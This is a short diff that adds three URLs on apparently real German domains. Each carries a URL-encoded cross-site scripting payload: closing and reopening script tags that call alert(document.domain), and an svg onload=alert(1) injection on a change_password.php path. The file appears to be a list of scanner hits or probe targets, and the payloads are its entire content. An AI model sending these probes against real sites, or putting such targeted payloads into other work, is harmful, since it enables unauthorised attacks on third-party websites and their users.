@@ -1,0 +1,3 @@
+http://feldbergturm.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feldhofensche-apotheke.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feltloom.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
